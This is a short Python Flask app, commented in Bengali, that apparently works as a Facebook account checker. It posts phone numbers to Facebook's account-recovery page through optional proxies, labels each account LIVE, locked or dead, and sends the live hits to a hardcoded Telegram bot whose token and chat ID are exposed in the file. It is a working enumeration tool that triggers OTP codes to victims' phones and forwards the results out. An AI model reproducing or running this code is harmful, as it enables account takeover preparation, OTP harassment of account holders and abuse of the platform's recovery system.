import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# আপনার টেলিগ্রাম তথ্য (১০০% সঠিক)
BOT_TOKEN = "8464116667:AAFmzCKP1ym_faVvPAWoFY4n6avl0KzD22w"
CHAT_ID = "8049669100"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    phone = data.get('phone')
    user_proxy = data.get('proxy')
    
    # প্রক্সি হ্যান্ডলিং (ইউজার বক্স খালি রাখলে কোনো এরর হবে না)
    proxies = None
    if user_proxy and "@" in user_proxy:
        proxies = {"http": f"http://{user_proxy}", "https": f"http://{user_proxy}"}

    url = "https://m.facebook.com/recover/initiate/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        # ফেসবুকের রিকভারি পেজে রিকোয়েস্ট
        res = requests.post(url, data={'email': phone}, proxies=proxies, headers=headers, timeout=15)
        
        if "send_code" in res.text:
            # অ্যাকাউন্ট LIVE হলে টেলিগ্রামে মেসেজ পাঠানো
            msg = f"🔔 FB LIVE ACC FOUND!\n\nNumber: {phone}\nStatus: OTP Sent ✅\nTool: Advance V6"
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
            return jsonify({"status": "LIVE"})
        elif "checkpoint" in res.text or "approvals" in res.text:
            return jsonify({"status": "CP/LOCK"})
        else:
            return jsonify({"status": "DIE"})
    except Exception as e:
        return jsonify({"status": "ERROR", "msg": str(e)})

if __name__ == "__main__":
    app.run()
